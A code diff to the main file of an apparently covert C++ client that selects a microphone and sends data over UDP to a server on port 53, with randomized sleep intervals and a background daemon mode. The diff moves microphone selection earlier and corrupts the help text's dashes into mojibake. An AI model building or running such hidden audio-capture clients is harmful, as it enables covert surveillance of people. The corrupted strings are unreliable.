@@ -27,14 +27,14 @@ void PrintHelp(const char* exe) {
         "\n"
         "  --server <ip>          Server IP address to send to (default: 127.0.0.1)\n"
         "  --port <port>          UDP port to use (default: 53)\n"
-        "  --packet-size <bytes>  Client packet size in bytes (1–65355) (default: 1024)\n"
+        "  --packet-size <bytes>  Client packet size in bytes (1â€“65355) (default: 1024)\n"
         "\n"
-        "  --sleep <mode>         Sleep profile (0–4) (default: 2)\n"
-        "                         0 = 5–20s (Tiny)\n" 
-        "                         1 = 10–40s (Short)\n"
-        "                         2 = 20–60s (Normal)\n"
-        "                         3 = 40–100s (Long)\n"
-        "                         4 = 15–400s (Random)\n"
+        "  --sleep <mode>         Sleep profile (0â€“4) (default: 2)\n"
+        "                         0 = 5â€“20s (Tiny)\n" 
+        "                         1 = 10â€“40s (Short)\n"
+        "                         2 = 20â€“60s (Normal)\n"
+        "                         3 = 40â€“100s (Long)\n"
+        "                         4 = 15â€“400s (Random)\n"
         "\n"
         "  --background           Run in the background (spawns a child process)\n"
         "  --daemon               Internal: indicates the background child process\n"
@@ -142,6 +142,10 @@ int main(int argc, char* argv[]) {
 
     AM.SetIsVerbose(isVerbose);
 
+    if (micIndex != -1) {
+        AM.SelectMicrophoneFromInt(micIndex);
+    }
+    
     if (!AM.Initialize()) {
         std::cerr << "[ERROR] Initialization failed.\n";
         return 1;
@@ -157,10 +161,6 @@ int main(int argc, char* argv[]) {
     AM.SetPacketSize(packetSize);
     AM.SetSleepMode(sleepInput);
     AM.SetListener(ip_address, port);
-
-    if (micIndex != -1) {
-        AM.SelectMicrophoneFromInt(micIndex);
-    }
 
     AM.Start();
     return 0;
